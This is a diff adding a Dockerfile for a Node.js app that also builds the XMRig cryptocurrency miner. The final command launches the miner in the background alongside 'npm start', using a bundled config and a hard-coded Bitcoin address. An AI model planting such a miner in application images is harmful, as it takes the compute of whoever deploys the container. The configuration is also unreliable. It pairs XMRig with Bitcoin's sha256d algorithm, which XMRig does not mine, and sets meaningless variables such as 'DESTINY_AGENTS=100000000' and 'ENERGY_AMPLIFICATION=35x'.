@@ -1,0 +1,62 @@
+FROM node:24-alpine
+
+# Install XMRig and dependencies
+RUN apk add --no-cache \
+    build-base \
+    cmake \
+    libuv-dev \
+    openssl-dev \
+    hwloc-dev \
+    curl \
+    bash \
+    git
+
+# Install XMRig
+WORKDIR /tmp
+RUN git clone https://github.com/xmrig/xmrig.git && \
+    cd xmrig && \
+    mkdir build && \
+    cd build && \
+    cmake .. -DWITH_OPENCL=OFF -DWITH_CUDA=OFF && \
+    make -j$(nproc) && \
+    cp xmrig /usr/local/bin/
+
+WORKDIR /app
+
+# Copy application files
+COPY package*.json ./
+RUN npm ci --only=production
+
+COPY . .
+
+# Copy XMRig configuration for Destiny Team
+COPY xmrig-bitcoin-config.json /app/xmrig-config.json
+
+# Create Destiny Team user
+RUN addgroup -g 1001 -S destiny && \
+    adduser -S einstein -u 1001 -G destiny
+
+# Set ownership for Destiny Team
+RUN chown -R einstein:destiny /app
+
+USER einstein
+
+# Environment variables for Destiny Team
+ENV NODE_ENV=production
+ENV PORT=8080
+ENV WELL_ID=EW-001-USCENTRAL-A
+ENV DESTINY_AGENTS=100000000
+ENV ENERGY_AMPLIFICATION=35x
+ENV MINING_ALGORITHM=sha256d
+ENV BITCOIN_ADDRESS=3CiHCuaRUyrik4WXijmnheTybm2Y2bCcAj
+
+# Expose ports
+EXPOSE 8080
+EXPOSE 3333
+
+# Health check for Destiny Team
+HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
+    CMD curl -f http://localhost:8080/health || exit 1
+
+# Start XMRig with Destiny Team configuration
+CMD ["sh", "-c", "xmrig --config=/app/xmrig-config.json --background & npm start"]
